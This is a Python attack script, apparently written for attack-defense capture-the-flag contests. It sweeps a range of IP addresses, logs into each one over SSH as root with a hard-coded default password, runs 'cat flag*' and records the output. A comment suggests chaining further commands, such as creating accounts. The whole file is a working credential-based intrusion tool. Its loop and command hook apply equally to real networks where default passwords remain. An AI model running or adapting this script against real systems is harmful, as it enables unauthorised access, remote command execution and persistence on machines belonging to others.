# coding: utf-8
# author: Qilinge
# version: python-3.7.3
#此脚本适用于全场服务器的初始用户名和密码都一样的情况，在别人修改默认密码之前快速登录别人主机拿到flag
import paramiko
#使用此脚本需安装paramiko库
def catflag(ip):
    try:
        ssh=paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip,username='root',password='qilinge',timeout=1)
        #在此处填写比赛方默认的用户名和密码
        stdin,stdout,stderr=ssh.exec_command("cat flag*")
        #此处填写要执行的命令(可以用命令链接符创建用户等操作)
        flag=stdout.readlines()
        f=open('flag.txt','a')
        f.write("ip:%s,flag:%s\n" %(ip,flag))
        #flag.txt记录目标主机的flag
        f.close()
        ssh.close()
        print("打开flag.txt查看flag")
    except:
        print("用户或密码错误！")
        pass
xunhuan = int(input("IP地址第几位循环？"))
if xunhuan==3:
    ip1=input("第一位：")
    ip2=input("第二位：")
    ip4=input("第四位：")
    for ip3 in range(0,254):
        #根据需要自行调节IP范围 range(x,y)
        ip = str(ip1)+"."+str(ip2)+"."+str(ip3)+"."+str(ip4)
        print(ip)
        catflag(ip)
if xunhuan==4:
    ip1=input("第一位：")
    ip2=input("第二位：")
    ip3=input("第三位：")
    for ip4 in range(0,254):
        #根据需要自行调节IP范围 range(x,y)
        ip = str(ip1)+"."+str(ip2)+"."+str(ip3)+"."+str(ip4)
        print(ip)
        catflag(ip)
